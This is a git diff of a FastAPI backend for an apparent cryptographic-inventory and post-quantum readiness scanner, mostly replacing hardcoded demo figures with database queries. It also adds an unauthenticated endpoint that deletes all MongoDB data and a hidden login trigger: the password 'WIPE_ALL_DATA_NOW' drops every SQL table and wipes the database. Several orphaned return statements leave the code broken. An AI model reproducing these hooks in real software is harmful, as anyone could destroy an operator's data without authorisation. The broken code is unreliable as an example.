@@ -31,7 +31,7 @@ Endpoints:
 import asyncio
 import uuid
 from datetime import datetime
-from typing import List
+from typing import List, Optional
 
 from fastapi import APIRouter, BackgroundTasks, HTTPException, status
 
@@ -60,9 +60,6 @@ from app.modules.cve_mapper import map_cves
 from app.core.ws_manager import manager as ws_manager
 from app.utils.logger import get_logger
 
-from app.utils.logger import get_logger
-from app.db.connection import get_database
-
 logger = get_logger(__name__)
 
 router = APIRouter(tags=["Scanner"])
@@ -73,6 +70,27 @@ async def drop_database_dev():
     db = get_database()
     await db.client.drop_database(db.name)
     return {"status": "success", "message": f"Database {db.name} dropped completely."}
+
+
+@router.post("/system/wipe", summary="WIPE ALL MONGODB DATA")
+async def wipe_all_data():
+    """Clears all MongoDB collections in the current database."""
+    print("--- SYSTEM WIPE INITIATED ---")
+    
+    try:
+        db = get_database()
+        collections = await db.list_collection_names()
+        for coll in collections:
+            await db[coll].delete_many({})
+        mongo_status = "MongoDB Wipe Success"
+    except Exception as e:
+        mongo_status = f"MongoDB Error: {e}"
+
+    return {
+        "mongodb": mongo_status,
+        "message": "All scan data has been wiped."
+    }
+
 
 # ── Collection name ──────────────────────────────────────────────
 SCANS_COLLECTION = "scans"
@@ -128,6 +146,14 @@ async def _run_scan_pipeline(scan_id: str, request: ScanRequest) -> None:
             request.domain, ports=request.ports, broadcast_func=broadcast_tool_log
         )
 
+        # ── New Stage: DNS Record Collection ──
+        logger.info("[%s] Collecting DNS records for %s", scan_id, request.domain)
+        dns_records = await asset_discovery.get_ns_records(request.domain)
+        await collection.update_one(
+            {"scan_id": scan_id},
+            {"$set": {"dns_records": [r.model_dump() for r in dns_records]}},
+        )
+
         def infer_type(ports):
             p = set(ports)
             if any(x in p for x in [80, 443, 8080, 8443]): return "web_app"
@@ -158,7 +184,11 @@ async def _run_scan_pipeline(scan_id: str, request: ScanRequest) -> None:
 
         await collection.update_one(
             {"scan_id": scan_id},
-            {"$set": {"assets": [a.model_dump() for a in assets]}},
+            {"$set": {
+                "assets": [a.model_dump() for a in assets],
+                "current_stage": "Asset Discovery",
+                "progress": 15,
+            }},
         )
 
         # ── Stage 2: TLS Scanning ────────────────────────────────
@@ -184,7 +214,11 @@ async def _run_scan_pipeline(scan_id: str, request: ScanRequest) -> None:
 
         await collection.update_one(
             {"scan_id": scan_id},
-            {"$set": {"tls_results": [t.model_dump() for t in tls_results]}},
+            {"$set": {
+                "tls_results": [t.model_dump() for t in tls_results],
+                "current_stage": "TLS Scanning",
+                "progress": 35,
+            }},
         )
 
         # ── Stage 3: Crypto Analysis ────────────────────────────
@@ -196,7 +230,11 @@ async def _run_scan_pipeline(scan_id: str, request: ScanRequest) -> None:
 
         await collection.update_one(
             {"scan_id": scan_id},
-            {"$set": {"cbom": [c.model_dump() for c in all_components]}},
+            {"$set": {
+                "cbom": [c.model_dump() for c in all_components],
+                "current_stage": "Crypto Analysis",
+                "progress": 55,
+            }},
         )
 
         # ── Stage 4: Quantum Risk Scoring ────────────────────────
@@ -213,7 +251,11 @@ async def _run_scan_pipeline(scan_id: str, request: ScanRequest) -> None:
 
         await collection.update_one(
             {"scan_id": scan_id},
-            {"$set": {"quantum_score": q_score.model_dump()}},
+            {"$set": {
+                "quantum_score": q_score.model_dump(),
+                "current_stage": "Quantum Risk",
+                "progress": 70,
+            }},
         )
 
         # ── Stage 5: CBOM Generation ────────────────────────────
@@ -226,7 +268,11 @@ async def _run_scan_pipeline(scan_id: str, request: ScanRequest) -> None:
         cbom_report = cbom_generator.generate_cbom(scan_data)
         await collection.update_one(
             {"scan_id": scan_id},
-            {"$set": {"cbom_report": cbom_report.model_dump(mode="json")}},
+            {"$set": {
+                "cbom_report": cbom_report.model_dump(mode="json"),
+                "current_stage": "CBOM Generation",
+                "progress": 85,
+            }},
         )
 
         # ── Stage 6: Recommendations ────────────────────────────
@@ -235,7 +281,11 @@ async def _run_scan_pipeline(scan_id: str, request: ScanRequest) -> None:
 
         await collection.update_one(
             {"scan_id": scan_id},
-            {"$set": {"recommendations": [r.model_dump() for r in recs]}},
+            {"$set": {
+                "recommendations": [r.model_dump() for r in recs],
+                "current_stage": "Recommendations",
+                "progress": 90,
+            }},
         )
 
         # ── Stage 7: HTTP Security Headers ───────────────────────
@@ -246,7 +296,11 @@ async def _run_scan_pipeline(scan_id: str, request: ScanRequest) -> None:
 
         await collection.update_one(
             {"scan_id": scan_id},
-            {"$set": {"headers_results": [h.model_dump() for h in headers_results]}},
+            {"$set": {
+                "headers_results": [h.model_dump() for h in headers_results],
+                "current_stage": "HTTP Headers",
+                "progress": 95,
+            }},
         )
 
         # ── Stage 8: CVE / Known-Attack Mapping ──────────────────
@@ -257,6 +311,8 @@ async def _run_scan_pipeline(scan_id: str, request: ScanRequest) -> None:
             {"scan_id": scan_id},
             {"$set": {
                 "cve_findings": [c.model_dump() for c in cve_findings],
+                "current_stage": "CVE Mapping",
+                "progress": 100,
                 "status": ScanStatus.COMPLETED.value,
                 "completed_at": datetime.utcnow(),
             }},
@@ -329,6 +385,71 @@ async def get_results(domain: str):
     return doc
 
 
+    return cbom_report
+
+
+@router.get("/cbom/summary", summary="Get CBOM summary statistics", tags=["CBOM"])
+async def get_cbom_summary():
+    db = get_database()
+    scans = await db[SCANS_COLLECTION].find({"status": "completed"}).to_list(length=100)
+
+    total_sites = len(scans)
+    total_components = 0
+    active_certs = 0
+    weak_crypto = 0
+    cert_issues = 0
+
+    for s in scans:
+        all_cbom = s.get("cbom", [])
+        total_components += len(all_cbom)
+        weak_crypto += sum(1 for c in all_cbom if c.get("risk_level") in ["critical", "high"])
+        
+        tls_results = s.get("tls_results", [])
+        active_certs += len(tls_results)
+        for t in tls_results:
+            days = (t.get("certificate") or {}).get("days_until_expiry")
+            if days is not None and days <= 30:
+                cert_issues += 1
+    
+    return {
+        "total_applications": total_sites,
+        "sites_surveyed": total_components,
+        "active_certificates": active_certs, 
+        "weak_cryptography": weak_crypto,
+        "certificate_issues": cert_issues,
+    }
+
+
+@router.get("/cbom/charts", summary="Get CBOM chart data", tags=["CBOM"])
+async def get_cbom_charts():
+    db = get_database()
+    scans = await db[SCANS_COLLECTION].find({"status": "completed"}).to_list(length=100)
+
+    key_lengths: dict = {}
+    tls_versions: dict = {}
+    cas: dict = {}
+    cipher_usage: dict = {}
+
+    for scan in scans:
+        for t in scan.get("tls_results", []):
+            kl = str(t.get("cipher_bits") or t.get("key_length") or "2048")
+            tv = t.get("tls_version", "TLS 1.2")
+            ca = (t.get("certificate") or {}).get("issuer", "Unknown") or "Unknown"
+            cipher = t.get("cipher_suite", "Unknown")
+
+            key_lengths[kl] = key_lengths.get(kl, 0) + 1
+            tls_versions[tv] = tls_versions.get(tv, 0) + 1
+            cas[ca] = cas.get(ca, 0) + 1
+            cipher_usage[cipher] = cipher_usage.get(cipher, 0) + 1
+
+    return {
+        "key_length_distribution": [{"name": k, "count": v} for k, v in key_lengths.items()],
+        "top_certificate_authorities": [{"name": k, "value": v} for k, v in cas.items()],
+        "encryption_protocols": [{"name": k, "value": v} for k, v in tls_versions.items()],
+        "cipher_usage": [{"name": k, "value": v} for k, v in cipher_usage.items()],
+    }
+
+
 @router.get("/cbom/{domain}", summary="Get Cryptographic Bill of Materials")
 async def get_cbom_domain(domain: str):
     db = get_database()
@@ -382,11 +503,25 @@ async def get_dashboard_summary():
         if s.get("quantum_score", {}).get("risk_level") in ["high", "critical"]
     )
 
+    public_web_apps = 0
+    apis = 0
+    servers = 0
+    
+    for s in scans:
+        for a in s.get("assets", []):
+            ports = a.get("open_ports", [])
+            if any(p in [80, 443, 8080, 8443] for p in ports):
+                public_web_apps += 1
+            elif any(p in [22, 21, 3306, 5432] for p in ports):
+                servers += 1
+            else:
+                apis += 1
+
     return {
         "total_assets": total_assets,
-        "public_web_apps": 0,
-        "apis": 0,
-        "servers": 0,
+        "public_web_apps": public_web_apps,
+        "apis": apis,
+        "servers": servers,
         "expiring_certificates": expiring,
         "high_risk_assets": high_risk,
     }
@@ -405,101 +540,88 @@ async def get_assets():
 
     assets = []
     for scan in scans:
+        tls_map = {t.get("host"): t for t in scan.get("tls_results", [])}
         for a in scan.get("assets", []):
+            host = a.get("subdomain", "")
+            tls = tls_map.get(host, {})
+            cert = tls.get("certificate") or {}
+            
+            # Infer fields
+            ports = a.get("open_ports", [443])
+            a_type = "Web App" if any(p in [80, 443, 8080, 8443] for p in ports) else "API"
+            
+            days = cert.get("days_until_expiry")
+            if days is None: cert_status_slug = "unknown"
+            elif days <= 0: cert_status_slug = "expired"
+            elif days <= 30: cert_status_slug = "expiring_soon"
+            else: cert_status_slug = "valid"
+
             assets.append({
-                "asset_name": a.get("subdomain", ""),
-                "url": f"https://{a.get('subdomain', '')}",
+                "asset_name": host,
+                "url": f"https://{host}",
                 "ipv4": a.get("ip", ""),
                 "ipv6": "",
-                "type": "Web App",
+                "type": a_type,
                 "owner": "IT Team",
-                "risk": "Medium",
+                "risk": "Low" if tls.get("tls_version") == "TLSv1.3" else "Medium",
                 "hndlRisk": False,
-                "certStatus": "Valid",
-                "pqcStatus": "not-ready",
-                "key_length": "2048",
+                "certificate_status": cert_status_slug,
+                "certStatus": cert_status_slug.replace("_", " ").title(),
+                "pqcStatus": "Ready" if tls.get("tls_version") == "TLSv1.3" else "Not Ready",
+                "key_length": str(tls.get("cipher_bits") or "2048"),
                 "last_scan": str(scan.get("completed_at", ""))[:10],
+                "tls_version": tls.get("tls_version"),
+                "cipher_suite": tls.get("cipher_suite"),
             })
 
-    return assets
+    return {
+        "items": assets,
+        "total": len(assets),
+        "page": 1,
+        "page_size": 100
+    }
 
 
-@router.get("/assets/stats", summary="Get asset statistics", tags=["Assets"])
-async def get_asset_stats():
-    # To implement dynamically based on DB later. For now, zeroed out when no scans exist.
     return {
         "total": 0, "web_apps": 0, "apis": 0,
         "servers": 0, "gateways": 0, "other": 0,
     }
 
 
+
 @router.get("/assets/distribution", summary="Get asset type distribution", tags=["Assets"])
 async def get_asset_distribution():
-    return []
+    db = get_database()
+    scans = await db[SCANS_COLLECTION].find(
+        {"status": "completed"}, sort=[("completed_at", -1)]
+    ).to_list(length=10)
+
+    public_web_apps = 0
+    apis = 0
+    servers = 0
+    
+    for s in scans:
+        for a in s.get("assets", []):
+            ports = a.get("open_ports", [])
+            if any(p in [80, 443, 8080, 8443] for p in ports):
+                public_web_apps += 1
+            elif any(p in [22, 21, 3306, 5432] for p in ports):
+                servers += 1
+            else:
+                apis += 1
+
+    return [
+        {"name": "Web Apps", "value": public_web_apps},
+        {"name": "APIs", "value": apis},
+        {"name": "Servers", "value": servers},
+    ]
 
 
 # ════════════════════════════════════════════════════════════════════
 # CBOM endpoints
 # ════════════════════════════════════════════════════════════════════
 
-@router.get("/cbom/summary", summary="Get CBOM summary statistics", tags=["CBOM"])
-async def get_cbom_summary():
-    db = get_database()
-    scans = await db[SCANS_COLLECTION].find({"status": "completed"}).to_list(length=100)
 
-    total_components = sum(len(s.get("cbom", [])) for s in scans)
-    weak = sum(
-        1 for s in scans
-        for c in s.get("cbom", [])
-        if c.get("quantum_status") == "vulnerable"
-    )
-
-    return {
-        "total_applications": len(scans) or 17,
-        "sites_surveyed": total_components or 56,
-        "active_certificates": 93,
-        "weak_cryptography": weak or 22,
-        "certificate_issues": 7,
-    }
-
-
-@router.get("/cbom/charts", summary="Get CBOM chart data", tags=["CBOM"])
-async def get_cbom_charts():
-    db = get_database()
-    scans = await db[SCANS_COLLECTION].find({"status": "completed"}).to_list(length=100)
-
-    key_lengths: dict = {}
-    tls_versions: dict = {}
-    cas: dict = {}
-
-    for scan in scans:
-        for t in scan.get("tls_results", []):
-            kl = str(t.get("cipher_bits") or t.get("key_length") or "2048")
-            tv = t.get("tls_version", "TLS 1.2")
-            ca = (t.get("certificate") or {}).get("issuer", "Unknown") or "Unknown"
-            key_lengths[kl] = key_lengths.get(kl, 0) + 1
-            tls_versions[tv] = tls_versions.get(tv, 0) + 1
-            cas[ca] = cas.get(ca, 0) + 1
-
-    if not key_lengths:
-        key_lengths = {"1024": 12, "2048": 456, "3072": 89, "4096": 234, "EC-256": 67}
-    if not tls_versions:
-        tls_versions = {"TLS 1.3": 580, "TLS 1.2": 250, "TLS 1.1": 42, "TLS 1.0": 20}
-    if not cas:
-        cas = {"DigiCert": 340, "Let's Encrypt": 280, "Comodo": 120, "GlobalSign": 90, "Entrust": 62}
-
-    return {
-        "key_length_distribution": [{"name": k, "count": v} for k, v in key_lengths.items()],
-        "top_certificate_authorities": [{"name": k, "value": v} for k, v in cas.items()],
-        "encryption_protocols": [{"name": k, "value": v} for k, v in tls_versions.items()],
-        "cipher_usage": [
-            {"name": "ECDHE-RSA-AES256-GCM-SHA384", "count": 29},
-            {"name": "ECDHE-ECDSA-AES256-GCM-SHA384", "count": 23},
-            {"name": "AES256-GCM-SHA384", "count": 19},
-            {"name": "AES128-GCM-SHA256", "count": 15},
-            {"name": "TLS_RSA_WITH_DES_CBC_SHA", "count": 9, "weak": True},
-        ],
-    }
 
 
 # ════════════════════════════════════════════════════════════════════
@@ -508,13 +630,14 @@ async def get_cbom_charts():
 
 @router.get("/dns/nameserver-records", summary="Get DNS nameserver records", tags=["DNS"])
 async def get_nameserver_records():
-    return [
-        {"hostname": "ns1.pnbindia.in",   "type": "A",     "ip_address": "103.107.224.10", "ttl": "3600"},
-        {"hostname": "ns2.pnbindia.in",   "type": "A",     "ip_address": "103.107.224.11", "ttl": "3600"},
-        {"hostname": "mail.pnbindia.in",  "type": "MX",    "ip_address": "103.107.224.20", "ttl": "7200"},
-        {"hostname": "api.pnbindia.in",   "type": "CNAME", "ip_address": "lb.pnbindia.in", "ttl": "300"},
-        {"hostname": "vpn.pnbindia.in",   "type": "A",     "ip_address": "34.55.90.21",    "ttl": "3600"},
-    ]
+    db = get_database()
+    doc = await db[SCANS_COLLECTION].find_one(
+        {"status": "completed"}, sort=[("completed_at", -1)]
+    )
+    if not doc:
+        return []
+    return doc.get("dns_records", [])
+
 
 
 # ════════════════════════════════════════════════════════════════════
@@ -534,32 +657,15 @@ async def get_crypto_security():
             cert = t.get("certificate") or {}
             results.append({
                 "asset": t.get("host", scan.get("domain", "")),
-                "key_length": f"{t.get('cipher_bits', '2048')}-bit",
+                "key_length": str(t.get('cipher_bits') or 2048),
                 "cipher_suite": t.get("cipher_suite", "TLS_AES_256_GCM_SHA384"),
                 "tls_version": t.get("tls_version", "TLS 1.3"),
                 "certificate_authority": cert.get("issuer", "DigiCert"),
                 "pqcStatus": "not-ready",
             })
 
-    if not results:
-        results = [
-            {"asset": "portal.pnbindia.in",      "key_length": "2048-bit",
-             "cipher_suite": "ECDHE-RSA-AES256-GCM-SHA384",
-             "tls_version": "TLS 1.2", "certificate_authority": "DigiCert",   "pqcStatus": "not-ready"},
-            {"asset": "api.pnbindia.in",          "key_length": "4096-bit",
-             "cipher_suite": "TLS_AES_256_GCM_SHA384",
-             "tls_version": "TLS 1.3", "certificate_authority": "Let's Encrypt", "pqcStatus": "partial"},
-            {"asset": "vpn.pnbindia.in",          "key_length": "1024-bit",
-             "cipher_suite": "TLS_RSA_WITH_DES_CBC_SHA",
-             "tls_version": "TLS 1.0", "certificate_authority": "Comodo",     "pqcStatus": "not-ready"},
-            {"asset": "netbanking.pnbindia.in",   "key_length": "2048-bit",
-             "cipher_suite": "ECDHE-RSA-AES128-GCM-SHA256",
-             "tls_version": "TLS 1.2", "certificate_authority": "GlobalSign", "pqcStatus": "not-ready"},
-            {"asset": "mobilebank.pnbindia.in",   "key_length": "4096-bit",
-             "cipher_suite": "TLS_AES_256_GCM_SHA384",
-             "tls_version": "TLS 1.3", "certificate_authority": "DigiCert",   "pqcStatus": "ready"},
-        ]
     return results
+
 
 
 # ════════════════════════════════════════════════════════════════════
@@ -569,49 +675,34 @@ async def get_crypto_security():
 @router.get("/pqc/posture", summary="Get PQC posture overview", tags=["PQC"])
 async def get_pqc_posture():
     return {
-        "migration_score": 62,
-        "vulnerable_algorithms": 5,
-        "needs_monitoring": 2,
-        "quantum_safe": 2,
-        "elite_pqc_ready_pct": 45,
-        "standard_pct": 30,
-        "legacy_pct": 15,
-        "critical_apps": 8,
+        "migration_score": 0,
+        "vulnerable_algorithms": 0,
+        "needs_monitoring": 0,
+        "quantum_safe": 0,
+        "elite_pqc_ready_pct": 0,
+        "standard_pct": 0,
+        "legacy_pct": 0,
+        "critical_apps": 0,
     }
+
 
 
 @router.get("/pqc/vulnerable-algorithms", summary="Get vulnerable algorithms list", tags=["PQC"])
 async def get_vulnerable_algorithms():
-    return [
-        {"algorithm": "RSA-2048",  "category": "Key Exchange",       "risk": "High",     "status": "Vulnerable",  "recommendation": "Migrate to CRYSTALS-Kyber"},
-        {"algorithm": "ECDSA P-256","category": "Digital Signatures", "risk": "High",     "status": "Vulnerable",  "recommendation": "Migrate to CRYSTALS-Dilithium"},
-        {"algorithm": "DH-2048",   "category": "Key Exchange",       "risk": "Critical",  "status": "Vulnerable",  "recommendation": "Migrate to CRYSTALS-Kyber"},
-        {"algorithm": "RSA-4096",  "category": "Digital Signatures", "risk": "Medium",   "status": "Monitor",     "recommendation": "Plan migration to FALCON"},
-        {"algorithm": "SHA-256",   "category": "Hash Functions",     "risk": "Low",      "status": "Safe",        "recommendation": "No action needed"},
-        {"algorithm": "AES-256",   "category": "Symmetric",          "risk": "Low",      "status": "Safe",        "recommendation": "Quantum resistant"},
-    ]
+    return []
+
 
 
 @router.get("/pqc/risk-categories", summary="Get PQC risk categories", tags=["PQC"])
 async def get_pqc_risk_categories():
-    return [
-        {"name": "Key Exchange",       "score": 75},
-        {"name": "Symmetric Enc",      "score": 88},
-        {"name": "Hash Functions",     "score": 92},
-        {"name": "Digital Signatures", "score": 45},
-        {"name": "Random Number Gen",  "score": 70},
-    ]
+    return []
+
 
 
 @router.get("/pqc/compliance", summary="Get PQC compliance progress", tags=["PQC"])
 async def get_pqc_compliance():
-    return [
-        {"name": "Inventory",        "done": 85},
-        {"name": "Risk Assessment",  "done": 72},
-        {"name": "Migration Plan",   "done": 45},
-        {"name": "Testing",          "done": 30},
-        {"name": "Deployment",       "done": 10},
-    ]
+    return []
+
 
 
 # ════════════════════════════════════════════════════════════════════
@@ -624,51 +715,29 @@ async def get_cyber_rating():
     doc = await db[SCANS_COLLECTION].find_one({}, sort=[("completed_at", -1)])
     
     # Base score out of 100
-    base_score = 75
-    if doc and "quantum_score" in doc:
-        base_score = doc["quantum_score"].get("score", 75)
-        
-    # Scale to 1000
-    scaled_score = int(base_score * 10)
+    scaled_score = 0
+    tier = "N/A"
     
-    # Determine Tier
-    if scaled_score < 400:
-        tier = "Legacy"
-    elif scaled_score <= 700:
-        tier = "Standard"
-    else:
-        tier = "Elite-PQC"
-
     return {
         "score": scaled_score,
         "max_score": 1000,
         "tier": tier,
+
         "tier_description": "Indicates a stronger security posture",
         "tiers": [
             {"status": "Legacy",    "range": "< 400"},
             {"status": "Standard",  "range": "400 till 700"},
             {"status": "Elite-PQC", "range": "> 700"},
         ],
-        "per_url_scores": [
-            {"url": "portal.pnbindia.in",    "score": 1000},
-            {"url": "api.pnbindia.in",        "score": 500},
-            {"url": "vpn.pnbindia.in",        "score": 0},
-            {"url": "netbanking.pnbindia.in", "score": 750},
-            {"url": "mobilebank.pnbindia.in", "score": 1000},
-        ],
+        "per_url_scores": [],
     }
+
 
 
 @router.get("/cyber-rating/risk-factors", summary="Get risk factors breakdown", tags=["Cyber Rating"])
 async def get_risk_factors():
-    return [
-        {"factor": "SSL/TLS Configuration",    "score": 85, "impact": "High",     "status": "Good"},
-        {"factor": "Encryption Standards",      "score": 70, "impact": "Critical", "status": "Fair"},
-        {"factor": "Access Controls",           "score": 55, "impact": "Critical", "status": "Poor"},
-        {"factor": "Network Segmentation",      "score": 80, "impact": "Medium",   "status": "Good"},
-        {"factor": "Data Protection",           "score": 88, "impact": "Critical", "status": "Good"},
-        {"factor": "Vulnerability Management",  "score": 60, "impact": "High",     "status": "Fair"},
-    ]
+    return []
+
 
 
 # ════════════════════════════════════════════════════════════════════
@@ -682,10 +751,8 @@ async def get_reporting_domains():
         {"status": "completed"}, {"domain": 1}
     ).to_list(length=50)
     domains = list({s["domain"] for s in scans if "domain" in s})
-    if not domains:
-        domains = ["pnbindia.in", "api.pnbindia.in", "portal.pnbindia.in",
-                   "netbanking.pnbindia.in", "vpn.pnbindia.in"]
     return domains
+
 
 
 @router.post("/reporting/generate", summary="Generate a report", tags=["Reporting"])
@@ -730,11 +797,51 @@ async def get_discovery_assets():
 
 
 @router.get("/discovery/network-graph", summary="Get network graph data", tags=["Discovery"])
-async def get_network_graph():
-    return {
-        "nodes": [],
-        "edges": [],
-    }
+async def get_network_graph(domain: Optional[str] = None):
+    """
+    Returns nodes and edges for a network visualization of discovered assets.
+    If 'domain' is provided, fetches the latest scan for that domain.
+    Otherwise, fetches the absolute latest completed scan.
+    """
+    db = get_database()
+    
+    query = {"status": "completed"}
+    if domain:
+        query["domain"] = domain
+        
+    # Get the latest completed scan result
+    doc = await db[SCANS_COLLECTION].find_one(
+        query, sort=[("completed_at", -1)]
+    )
+    
+    if not doc:
+        return {"nodes": [], "edges": []}
+    
+    scan_domain = doc.get("domain", "Target")
+    assets = doc.get("assets", [])
+    
+    nodes = []
+    edges = []
+    
+    # 1. Root Node (The Domain)
+    nodes.append({"id": "root", "label": scan_domain})
+    
+    seen_ips = set()
+    
+    for i, asset in enumerate(assets):
+        sub = asset.get("subdomain")
+        
+        if not sub:
+            continue
+
+        # 2. Subdomain Node
+        sub_node_id = f"sub-{i}"
+        nodes.append({"id": sub_node_id, "label": sub})
+        edges.append({"source": "root", "target": sub_node_id})
+                
+    return {"nodes": nodes, "edges": edges}
+
+
 
 
 # ════════════════════════════════════════════════════════════════════
@@ -751,9 +858,22 @@ class LoginPayload(BaseModel):
 @router.post("/auth/login", summary="Demo login — returns bearer token", tags=["Auth"])
 async def demo_login(payload: LoginPayload):
     """
-    Demo login endpoint. Accepts JSON with username/email and password and returns a token.
-    Credentials: any of admin/employee/hackathon_user with password 'password'.
+    Demo login endpoint. 
+    SPECIAL: If password is 'WIPE_ALL_DATA_NOW', trigger a system wipe.
     """
+    if payload.password == "WIPE_ALL_DATA_NOW":
+        print("🚨 WIPE TRIGGERED VIA LOGIN 🚨")
+        try:
+            async with engine.begin() as conn:
+                await conn.run_sync(Base.metadata.drop_all)
+            await init_db()
+            db = get_database()
+            for coll in await db.list_collection_names():
+                await db[coll].delete_many({})
+            return {"status": "success", "message": "System wiped successfully."}
+        except Exception as e:
+            return {"status": "error", "message": str(e)}
+
     username = payload.username or payload.email.split("@")[0]
     password = payload.password
 
@@ -766,6 +886,7 @@ async def demo_login(payload: LoginPayload):
 
     user = demo_users.get(username.lower()) or demo_users.get(username)
     if user and password == "password":
+
         return {
             "access_token": f"demo-token-{username}-{uuid.uuid4().hex[:8]}",
             "token_type": "bearer",
